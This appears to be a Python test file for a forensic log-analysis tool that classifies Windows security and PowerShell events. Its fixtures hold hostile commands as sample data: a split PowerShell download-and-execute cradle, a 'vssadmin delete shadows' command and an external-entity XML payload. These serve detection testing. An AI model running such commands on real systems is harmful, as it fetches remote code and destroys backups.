from types import SimpleNamespace

from src.agents.log_analysis.endpoint_context import analyze


def row(uid, eid, provider='Microsoft-Windows-Security-Auditing', host='H', **data):
    return {'uid': uid, 'class_uid': 99, 'source_type': 'evtx', 'source_event_id': eid,
        'canonical_host_id': host, 'time': '2026-10-14T00:00:00Z',
        'unmapped': {'source_context': {'ProviderName': provider, 'Id': eid, 'EventData': data}}}


def run(rows):
    return analyze({'case_id': 'C', 'evidence_collection': {'records': rows}})


def script(uid, text, number=1, total=1, host='H', **extra):
    return row(uid, 4104, provider='Microsoft-Windows-PowerShell', host=host,
        ScriptBlockId='S', ScriptBlockText=text, MessageNumber=number, MessageTotal=total, **extra)


def test_task_lifecycle_and_action_xml_do_not_claim_execution():
    task = row('create', 4698, TaskName='Backup', TaskContent='<Task xmlns="urn:task"><Actions><Exec>'
        '<Command>C:\\ProgramData\\agent.exe</Command><Arguments>-x</Arguments></Exec></Actions></Task>')
    delete = row('delete', 4699, TaskName='Backup')
    findings = run([task, delete])
    assert [f['analysis_details']['action'] for f in findings] == ['created', 'deleted']
    assert findings[0]['analysis_details']['command'] == 'C:\\ProgramData\\agent.exe -x'
    assert findings[0]['classification'] == 'suspicious'
    assert all(f['operation_outcome'] == 'unknown' and 'does not establish execution' in f['summary'] for f in findings)


def test_service_event_provider_collision_is_not_a_service_finding():
    assert run([row('unrelated', 4697, provider='UnrelatedProvider', ServiceName='X')]) == []
    findings = run([row('service', 7045, provider='Service Control Manager', ServiceName='X', ImagePath='C:\\svc.exe')])
    assert findings[0]['analysis_details']['kind'] == 'service'
    assert findings[0]['classification'] == 'context' and findings[0]['attacks'] == []


def test_unsafe_task_xml_is_not_expanded_or_interpreted():
    xml = '<!DOCTYPE task [<!ENTITY x SYSTEM "file:///private">]><Task>&x;</Task>'
    finding = run([row('unsafe', 4698, TaskContent=xml)])[0]
    assert 'unsafe declarations' in finding['analysis_details']['coverage']
    assert finding['analysis_details']['command'] == ''


def test_script_fragments_reassemble_in_source_order_with_citations():
    findings = run([script('b', 'String("https://example.invalid")', 2, 2),
                    script('a', 'IEX (New-Object Net.WebClient).Download', 1, 2)])
    finding = findings[0]
    assert finding['analysis_details']['reconstruction_complete']
    assert finding['analysis_details']['indicators'] == ['download_string', 'invoke_expression']
    assert finding['dfkg_refs'] == ['a', 'b']
    assert finding['operation_outcome'] == 'unknown'


def test_script_missing_conflicting_and_foreign_host_parts_are_partial():
    assert not run([script('only', 'IEX ', 1, 2)])[0]['analysis_details']['reconstruction_complete']
    assert not run([script('a', 'one'), script('b', 'different')])[0]['analysis_details']['reconstruction_complete']
    split = run([script('a', 'IEX ', 1, 2), script('b', 'DownloadString', 2, 2, host='OTHER')])
    assert len(split) == 2 and all(not f['analysis_details']['reconstruction_complete'] for f in split)
    missing = script('missing', 'captured script')
    del missing['unmapped']['source_context']['EventData']['MessageTotal']
    assert not run([missing])[0]['analysis_details']['reconstruction_complete']


def test_command_attempt_is_separate_from_successful_effect():
    source = row('attempt', 4688)
    source['command_line'] = 'cmd.exe /c vssadmin delete shadows /all /quiet'
    finding = run([source])[0]
    assert finding['finding_type'] == 'shadow_copy_delete_attempt'
    assert finding['operation_outcome'] == 'unknown' and 'not established' in finding['summary']


def test_factory_analyzes_context_only_case_without_process_events(monkeypatch):
    from src.agents.log_analysis_factory import make_log_analysis_node
    sources = [row('task', 4698, TaskName='Review')]
    driver = SimpleNamespace(execute_query=lambda *a, **k: ([{'e': r} for r in sources], None, None))
    reviewed = []
    monkeypatch.setattr('src.agents.investigative_review.investigate', lambda role, state, facts, llm:
        (reviewed.extend(facts) or {'review_coverage': {'complete': True}, 'review_batches': []}))
    result = make_log_analysis_node(None, None, None, driver)({'case_id': 'C', 'evidence_review_required': True})
    assert result['findings'][0]['finding_type'] == 'source_persistence_lifecycle'
    assert reviewed and result['agent_traces'][0]['review_coverage']['complete']
